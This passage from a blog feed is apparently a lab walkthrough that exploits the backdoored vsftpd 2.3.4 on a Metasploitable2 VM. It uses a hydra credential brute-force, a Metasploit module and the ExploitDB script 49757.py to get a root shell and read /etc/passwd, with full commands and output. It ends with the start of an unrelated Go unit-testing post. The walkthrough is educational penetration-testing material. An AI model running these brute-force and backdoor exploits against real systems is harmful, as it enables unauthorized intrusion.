class="line">Host is up (0.00064s latency).</span><br><span class="line">Not shown: 977 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">21/tcp   open  ftp         vsftpd 2.3.4</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 192.168.244.140</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      vsFTPd 2.3.4 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li>VSFTPD 2.3.4 exploit with hydra</li></ol><p>First , we need construct dictionaries about username and password<br>here’s the dictionaries which usernames named usernames.txt and passwords named passwords.txt</p><p>then , we use the tools hydra with the follow command line:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L /home/kali/Desktop/cd/mywordlists/usernames.txt -P /home/kali/Desktop/cd/mywordlists/passwords.txt 192.168.244.136 ftp -V</span><br></pre></td></tr></table></figure><p>here’s the command line ouput looks like:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-26 16:20:39</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task</span><br><span class="line">[DATA] attacking ftp://192.168.244.136:21/</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;admin&quot; - pass &quot;admin&quot; - 1 of 25 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;admin&quot; - pass &quot;msfadmin&quot; - 2 of 25 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;admin&quot; - pass &quot;root&quot; - 3 of 25 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;admin&quot; - pass &quot;user&quot; - 4 of 25 [child 3] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;admin&quot; - pass &quot;&quot; - 5 of 25 [child 4] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;msfadmin&quot; - pass &quot;admin&quot; - 6 of 25 [child 5] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;msfadmin&quot; - pass &quot;msfadmin&quot; - 7 of 25 [child 6] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;msfadmin&quot; - pass &quot;root&quot; - 8 of 25 [child 7] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;msfadmin&quot; - pass &quot;user&quot; - 9 of 25 [child 8] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;msfadmin&quot; - pass &quot;&quot; - 10 of 25 [child 9] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;root&quot; - pass &quot;admin&quot; - 11 of 25 [child 10] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;root&quot; - pass &quot;msfadmin&quot; - 12 of 25 [child 11] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;root&quot; - pass &quot;root&quot; - 13 of 25 [child 12] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;root&quot; - pass &quot;user&quot; - 14 of 25 [child 13] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;root&quot; - pass &quot;&quot; - 15 of 25 [child 14] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;user&quot; - pass &quot;admin&quot; - 16 of 25 [child 15] (0/0)</span><br><span class="line">[21][ftp] host: 192.168.244.136   login: msfadmin   password: msfadmin</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;user&quot; - pass &quot;msfadmin&quot; - 17 of 25 [child 6] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;user&quot; - pass &quot;root&quot; - 18 of 25 [child 5] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;user&quot; - pass &quot;user&quot; - 19 of 25 [child 7] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;user&quot; - pass &quot;&quot; - 20 of 25 [child 8] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;&quot; - pass &quot;admin&quot; - 21 of 25 [child 9] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;&quot; - pass &quot;msfadmin&quot; - 22 of 25 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;&quot; - pass &quot;root&quot; - 23 of 25 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;&quot; - pass &quot;user&quot; - 24 of 25 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;&quot; - pass &quot;&quot; - 25 of 25 [child 4] (0/0)</span><br><span class="line">[21][ftp] host: 192.168.244.136   login: user   password: user</span><br><span class="line"></span><br><span class="line">1 of 1 target successfully completed, 2 valid passwords found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-03-05 21:20:47</span><br></pre></td></tr></table></figure><p>here, we found two users we could use to login the ftp server:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.244.136</span><br><span class="line">Connected to 192.168.244.136.</span><br><span class="line">220 (vsFTPd 2.3.4)</span><br><span class="line">Name (192.168.244.136:kali): msfadmin</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||54670|).</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 1000     1000            0 Oct 21 21:49 gordon.txt</span><br><span class="line">-rw-r--r--    1 1000     1000           29 Oct 30 23:31 myfile.log</span><br><span class="line">-rw-r--r--    1 1000     1000          914 Oct 21 14:59 nmap-list.txt</span><br><span class="line">drwxr-xr-x    6 1000     1000         4096 Apr 28  2010 vulnerable</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; cd /</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; pwd</span><br><span class="line">Remote directory: /</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||54956|).</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    2 0        0            4096 May 14  2012 bin</span><br><span class="line">drwxr-xr-x    4 0        0            1024 May 14  2012 boot</span><br><span class="line">lrwxrwxrwx    1 0        0              11 Apr 28  2010 cdrom -&gt; media/cdrom</span><br><span class="line">drwxr-xr-x   13 0        0           13860 Jan 05 20:57 dev</span><br><span class="line">drwxr-xr-x   94 0        0            4096 Jan 05 21:21 etc</span><br><span class="line">drwxr-xr-x    6 0        0            4096 Apr 16  2010 home</span><br><span class="line">drwxr-xr-x    2 0        0            4096 Mar 16  2010 initrd</span><br><span class="line">lrwxrwxrwx    1 0        0              32 Apr 28  2010 initrd.img -&gt; boot/initrd.img-2.6.24-16-server</span><br><span class="line">drwxr-xr-x   13 0        0            4096 May 14  2012 lib</span><br><span class="line">drwx------    2 0        0           16384 Mar 16  2010 lost+found</span><br><span class="line">drwxr-xr-x    4 0        0            4096 Mar 16  2010 media</span><br><span class="line">drwxr-xr-x    3 0        0            4096 Apr 28  2010 mnt</span><br><span class="line">-rw-------    1 0        0           57012 Jan 05 20:54 nohup.out</span><br><span class="line">drwxr-xr-x    2 0        0            4096 Mar 16  2010 opt</span><br><span class="line">dr-xr-xr-x  118 0        0               0 Jan 05 20:54 proc</span><br><span class="line">drwxr-xr-x   13 0        0            4096 Jan 05 20:54 root</span><br><span class="line">drwxr-xr-x    2 0        0            4096 May 14  2012 sbin</span><br><span class="line">drwxr-xr-x    2 0        0            4096 Mar 16  2010 srv</span><br><span class="line">drwxr-xr-x   12 0        0               0 Jan 05 20:54 sys</span><br><span class="line">drwxrwxrwt    5 0        0            4096 Jan 05 20:59 tmp</span><br><span class="line">drwxr-xr-x   12 0        0            4096 Apr 28  2010 usr</span><br><span class="line">drwxr-xr-x   14 0        0            4096 Mar 17  2010 var</span><br><span class="line">lrwxrwxrwx    1 0        0              29 Apr 28  2010 vmlinuz -&gt; boot/vmlinuz-2.6.24-16-server</span><br><span class="line">226 Directory send OK.</span><br></pre></td></tr></table></figure><ol start="3"><li>VSFTPD 2.3.4 exploit with metasploit:</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search vsftpd</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                  Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                  ---------------  ----       -----  -----------</span><br><span class="line">   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service</span><br><span class="line">   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor</span><br><span class="line"></span><br><span class="line">msf6 &gt; use 1</span><br><span class="line">[*] No payload configured, defaulting to cmd/unix/interact</span><br><span class="line">msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; show info</span><br><span class="line"></span><br><span class="line">       Name: VSFTPD v2.3.4 Backdoor Command Execution</span><br><span class="line">     Module: exploit/unix/ftp/vsftpd_234_backdoor</span><br><span class="line">   Platform: Unix</span><br><span class="line">       Arch: cmd</span><br><span class="line"> Privileged: Yes</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Excellent</span><br><span class="line">  Disclosed: 2011-07-03</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  hdm &lt;x@hdm.io&gt;</span><br><span class="line">  MC &lt;mc@metasploit.com&gt;</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">      Id  Name</span><br><span class="line">      --  ----</span><br><span class="line">  =&gt;  0   Automatic</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  No</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name    Current Setting  Required  Description</span><br><span class="line">  ----    ---------------  --------  -----------</span><br><span class="line">  RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html</span><br><span class="line">  RPORT   21               yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line">  Space: 2000</span><br><span class="line">  Avoid: 0 characters</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module exploits a malicious backdoor that was added to the       VSFTPD download</span><br><span class="line">  archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between</span><br><span class="line">  June 30th 2011 and July 1st 2011 according to the most recent information</span><br><span class="line">  available. This backdoor was removed on July 3rd 2011.</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  OSVDB (73573)</span><br><span class="line">  http://pastebin.com/AetT9sS5</span><br><span class="line">  http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info -d command.</span><br><span class="line"></span><br><span class="line">msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set rhosts 192.168.244.136</span><br><span class="line">rhosts =&gt; 192.168.244.136</span><br><span class="line">msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.244.136:21 - Banner: 220 (vsFTPd 2.3.4)</span><br><span class="line">[*] 192.168.244.136:21 - USER: 331 Please specify the password.</span><br><span class="line">[+] 192.168.244.136:21 - Backdoor service has been spawned, handling...</span><br><span class="line">[+] 192.168.244.136:21 - UID: uid=0(root) gid=0(root)</span><br><span class="line">[*] Found shell.</span><br><span class="line">id</span><br><span class="line">[*] Command shell session 1 opened (192.168.244.140:41279 -&gt; 192.168.244.136:6200) at 2024-01-05 16:46:43 -0500</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line">ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue </span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000</span><br><span class="line">    link/ether 00:0c:29:d5:0c:8b brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.244.136/24 brd 192.168.244.255 scope global eth0</span><br><span class="line">    inet6 fe80::20c:29ff:fed5:c8b/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: eth1: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop qlen 1000</span><br><span class="line">    link/ether 00:0c:29:d5:0c:95 brd ff:ff:ff:ff:ff:ff</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>VSFTPD 2.3.4 exploit with python POC:</li></ol><p>First, we should search the valid POC from kali’s exploit db with follow command line:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/cd]</span><br><span class="line">└─# searchsploit -t vsftpd      </span><br><span class="line">----------------------------------------------------------------------------------------------------------</span><br><span class="line"> Exploit Title                                                                   |  Path</span><br><span class="line">----------------------------------------------------------------------------------------------------------</span><br><span class="line">vsftpd 2.0.5 - &#x27;CWD&#x27; (Authenticated) Remote Memory Consumption                   | linux/dos/5814.pl</span><br><span class="line">vsftpd 2.0.5 - &#x27;deny_file&#x27; Option Remote Denial of Service (1)                   | windows/dos/31818.sh</span><br><span class="line">vsftpd 2.0.5 - &#x27;deny_file&#x27; Option Remote Denial of Service (2)                   | windows/dos/31819.pl</span><br><span class="line">vsftpd 2.3.2 - Denial of                                                         | linux/dos/16270.c</span><br><span class="line">vsftpd 2.3.4 - Backdoor Command Execution                                        | unix/remote/49757.py</span><br><span class="line">vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                           | unix/remote/17491.rb</span><br><span class="line">vsftpd 3.0.3 - Remote Denial of Service                                          | multiple/remote/49719.py</span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line">Papers: No Results</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Next, we copy the valid POC to current work directory, and try to exploit , the follow shows the exploit process: </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/cd]</span><br><span class="line">└─# searchsploit -m  unix/remote/49757.py </span><br><span class="line"></span><br><span class="line">  Exploit: vsftpd 2.3.4 - Backdoor Command Execution</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/49757</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/unix/remote/49757.py</span><br><span class="line">    Codes: CVE-2011-2523</span><br><span class="line"> Verified: True</span><br><span class="line">File Type: Python script, ASCII text executable</span><br><span class="line">cp: overwrite &#x27;/home/kali/Desktop/cd/49757.py&#x27;? yes</span><br><span class="line">Copied to: /home/kali/Desktop/cd/49757.py</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                                                                                                                                                                                   </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/cd]</span><br><span class="line">└─# chmod +x 49757.py</span><br><span class="line">                                                                                                                                                                                                   </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/cd]</span><br><span class="line">└─# ls</span><br><span class="line"> 49757.py  wordlists                                                                                                                                                                                                   </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/cd]</span><br><span class="line">└─# python ./49757.py  192.168.244.136 </span><br><span class="line">Success, shell opened</span><br><span class="line">Send `exit` to quit shell</span><br><span class="line">ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue </span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000</span><br><span class="line">    link/ether 00:0c:29:d5:0c:8b brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.244.136/24 brd 192.168.244.255 scope global eth0</span><br><span class="line">    inet6 fe80::20c:29ff:fed5:c8b/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: eth1: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop qlen 1000</span><br><span class="line">    link/ether 00:0c:29:d5:0c:95 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">pwd</span><br><span class="line">/</span><br><span class="line">ls</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">cdrom</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">initrd</span><br><span class="line">initrd.img</span><br><span class="line">lib</span><br><span class="line">lost+found</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">nohup.out</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">vmlinuz</span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">dhcp:x:101:102::/nonexistent:/bin/false</span><br><span class="line">syslog:x:102:103::/home/syslog:/bin/false</span><br><span class="line">klog:x:103:104::/home/klog:/bin/false</span><br><span class="line">sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash</span><br><span class="line">bind:x:105:113::/var/cache/bind:/bin/false</span><br><span class="line">postfix:x:106:115::/var/spool/postfix:/bin/false</span><br><span class="line">ftp:x:107:65534::/home/ftp:/bin/false</span><br><span class="line">postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash</span><br><span class="line">mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false</span><br><span class="line">tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false</span><br><span class="line">distccd:x:111:65534::/:/bin/false</span><br><span class="line">user:x:1001:1001:just a user,111,,:/home/user:/bin/bash</span><br><span class="line">service:x:1002:1002:,,,:/home/service:/bin/bash</span><br><span class="line">telnetd:x:112:120::/nonexistent:/bin/false</span><br><span class="line">proftpd:x:113:65534::/var/run/proftpd:/bin/false</span><br><span class="line">statd:x:114:65534::/var/lib/nfs:/bin/false</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;metasploitable-linux-VSFTPD-2-3-4-exploit-with-hydra-metasploit-python-POC&quot;&gt;&lt;a href=&quot;#metasploitable-linux-VSFTPD-2-3-4-exploit-with</summary>
      
    
    
    
    <category term="Penetration Test" scheme="http://example.com/categories/Penetration-Test/"/>
    
    <category term="metasploitable2" scheme="http://example.com/categories/Penetration-Test/metasploitable2/"/>
    
    <category term="linux" scheme="http://example.com/categories/Penetration-Test/metasploitable2/linux/"/>
    
    <category term="VSFTPD 2.3.4 exploit" scheme="http://example.com/categories/Penetration-Test/metasploitable2/linux/VSFTPD-2-3-4-exploit/"/>
    
    
  </entry>
  
  <entry>
    <title>About File Testing in the Go Language.</title>
    <link href="http://example.com/2019/02/12/goAboutUnitTest/"/>
    <id>http://example.com/2019/02/12/goAboutUnitTest/</id>
    <published>2019-02-13T01:59:33.000Z</published>
    <updated>2023-10-17T16:31:11.713Z</updated>
    
    <content type="html"><![CDATA[<p>To test a Go file, you typically need to create a test file in the same directory as the file you’re testing and write your test code within it. Here’s an example: you have a file named math.go containing a simple mathematical function ‘Add.’ Then, you will create a test file named math_test.go to test this function.</p><p>Assuming the math.go file is as follows:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// math.go</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Add</span><span class="params">(a, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>You can then create a math_test.go file to write your test code:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span 